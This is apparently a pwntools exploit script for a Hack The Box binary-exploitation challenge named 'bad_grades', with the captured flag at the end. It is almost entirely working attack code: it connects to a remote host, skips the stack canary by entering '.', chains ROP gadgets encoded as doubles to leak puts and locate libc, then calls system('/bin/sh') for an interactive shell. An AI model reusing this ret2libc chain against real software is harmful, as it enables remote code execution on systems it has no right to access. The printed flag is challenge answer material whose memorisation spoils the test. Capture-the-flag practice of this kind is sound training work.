#!/usr/bin/env python3

from pwn import *
import struct
import time


def i2d(v):
    ret = struct.pack('Q', v)
    return struct.unpack('d', ret)[0]
libc = ELF('./libc.so.6')


LOCAL = False
if LOCAL:
    r = process('./bad_grades_patched')
else:
    r = remote('94.237.57.138',44648)

r.sendlineafter("> ", "2")

# 33 = canary, 34 = rbp, 35 = ret 
# 36th value should be the return address
counter = 35 + 4
r.sendlineafter(": ", str(counter));
for i in range(35):
    r.sendlineafter(": ", str("."))

# need to leak system 
puts_got = 0x601fa8
puts_plt = 0x400680
pop_rdi_ret = 0x0000000000401263
add_new = 0x400fd5
exit_ = 0x400700
pop_rsi_ret = 0x401261

# need to call printf 

r.sendlineafter(": ", str(i2d(pop_rdi_ret))) # actually there is a canary so no overwrite?

r.sendlineafter(": ", str(i2d(puts_got)))
r.sendlineafter(": ", str(i2d(puts_plt)))
r.sendlineafter(": ", str(i2d(add_new)))

r.recvline()
leak = int.from_bytes(r.recvline().strip(b'\n'), byteorder='little')
print("leak: ", hex(leak))
libc_base = leak - libc.symbols['puts']
print("libc base: ", hex(libc_base))
libc.address = libc_base
system = libc.symbols["system"]
bin_sh = libc.search(b'/bin/sh').__next__()
print("system: ", hex(system))

r.sendlineafter(": ", str(counter+3))
for i in range(35):
    r.sendlineafter(": ", str("."))

""" gdb.attach(r) """
""" time.sleep(1) """

r.sendlineafter(": ", str(i2d(pop_rdi_ret)))
r.sendlineafter(": ", str(i2d(bin_sh)))
r.sendlineafter(": ", str(i2d(pop_rsi_ret)))
r.sendlineafter(": ", str(i2d(0)))
r.sendlineafter(": ", str(i2d(0)))
r.sendlineafter(": ", str(i2d(system)))
r.sendlineafter(": ", str(i2d(exit_)))

r.interactive()
# flag: HTB{c4n4ry_1s_4fr41d_0f_s1gn3d_numb3r5}

